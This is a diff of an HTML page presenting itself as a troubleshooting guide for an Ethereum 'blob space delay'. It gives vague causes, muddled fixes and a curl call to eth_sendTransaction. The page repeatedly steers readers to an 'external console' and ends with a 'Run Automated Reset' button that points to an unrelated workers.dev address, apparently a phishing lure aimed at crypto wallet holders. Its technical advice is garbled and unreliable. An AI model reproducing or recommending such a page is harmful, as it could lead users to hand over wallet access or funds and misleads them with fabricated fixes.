@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,34 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar wording, which suggests that the network is currently overwhelmed and cannot process transactions at the expected speed.</li>
+<li>Users experience delayed transactions and high gas fees on the Ethereum network, with error messages indicating a "blob space delay" or similar issues, resulting in slow processing times for their transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's current limitations in handling a high volume of transactions, particularly those involving large amounts of data such as NFTs or complex smart contracts. When the network is congested, transactions may be delayed or fail as the network struggles to keep up with demand.</li>
+<li>The error occurs due to the Ethereum network's limitations in handling large amounts of data, particularly with the introduction of blob-related transactions, which consume more space on the blockchain and slow down the verification process.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas price to prioritize the transaction: this can help the transaction be processed faster, but at a higher cost.</li>
-<li>Use a transaction accelerator service: some services offer the ability to accelerate transactions for a fee.</li>
-<li>Edit the transaction manually using a command-line tool:</li>
+<li>Increase the gas limit to prioritize transactions: <code>eth_estimateGas</code></li>
+<li>Use a third-party service to batch transactions and reduce network load: </li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="s1">&#39;{ </span>
-<span class="s1">  &quot;from&quot;: &quot;0x...your_address...&quot;, </span>
-<span class="s1">  &quot;to&quot;: &quot;0x...recipient_address...&quot;, </span>
-<span class="s1">  &quot;value&quot;: &quot;0x...amount...&quot;, </span>
-<span class="s1">  &quot;gas&quot;: &quot;0x...gas...&quot;, </span>
-<span class="s1">  &quot;gasPrice&quot;: &quot;0x...gas_price...&quot; </span>
-<span class="s1">}&#39;</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>You may want to consider using an external console with more advanced features to diagnose and resolve the issue. </p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of Ethereum transactions and gas mechanics</li>
-<li>Access to a command-line tool or Ethereum wallet software</li>
-<li>Knowledge of the Ethereum network's current congestion and gas price trends</li>
+<li>Configure a local Ethereum node to manually manage transaction verification and gas pricing</li>
 </ul>
+<p>Prerequisites:
+* An Ethereum wallet with a sufficient balance
+* A basic understanding of Ethereum transaction mechanics
+* Access to a reliable Ethereum node or third-party service</p>
+<p>Consider utilizing an external console to streamline the troubleshooting process and execute the above commands efficiently.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
